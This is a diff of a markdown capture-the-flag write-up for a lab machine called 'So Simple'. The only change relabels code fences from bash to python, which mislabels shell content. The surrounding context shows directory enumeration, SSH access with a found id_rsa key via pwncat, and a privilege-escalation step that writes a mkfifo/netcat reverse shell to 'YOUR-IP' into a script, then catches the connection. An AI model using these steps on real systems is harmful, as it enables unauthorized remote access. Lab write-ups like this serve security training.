@@ -66,7 +66,7 @@ so we have ports 22,80 open. I have enumerated port 80 (HTTP) because there is n
 feroxbuster -u http://$IP:80/ -t 10 -w /root/.config/AutoRecon/wordlists/dirbuster.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -e
 ````````
 
-````````bash
+````````python
 
 200      GET      207l     1079w    47258c http://192.168.65.78/so-simple.png
 200      GET       77l       39w      495c http://192.168.65.78/
@@ -398,7 +398,7 @@ Cool! We got our first flag. Let's escalate our Privilege to root.
 
 ### Privilage Esculation 
 
-````````bash
+````````python
 (remote) www-data@so-simple:/home/max$ ls -la
 total 52
 drwxr-xr-x 7 max  max  4096 Aug 22  2020 .
@@ -427,7 +427,7 @@ id_rsa ━━━━━━━━━━━━━━━━━━━━━━━━�
 ````````
 In order to use id_rsa, we need to change its permissions. run: ``chmod 600 id_rsa``
 
-````````bash
+````````python
 pwncat-cs max@$IP -i id_rsa
 [01:01:00] Welcome to pwncat 🐈!                                                                                                                             __main__.py:164
 [01:01:06] 192.168.190.78:22: registered new host w/ db                                                                                                       manager.py:957
@@ -458,7 +458,7 @@ steven@so-simple:/opt$ ls
 ````````
 Interesting.. no directory not a problem. lets create them
 
-````````bash
+````````python
 steven@so-simple:/opt$ mkdir tools
 steven@so-simple:/opt$ cd tools
 steven@so-simple:/opt/tools$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR-IP 443 >/tmp/f' > server-health.sh
@@ -469,7 +469,7 @@ rm: cannot remove '/tmp/f': No such file or directory
 ````````
 ## NOTE: Start your Listener First
 
-````````bash
+````````python
 pwncat-cs -lp 443                     
 [01:11:53] Welcome to pwncat 🐈!                                                                                                                                              __main__.py:164
 [01:11:55] received connection from 192.168.190.78:55410                                                                                                                           bind.py:84
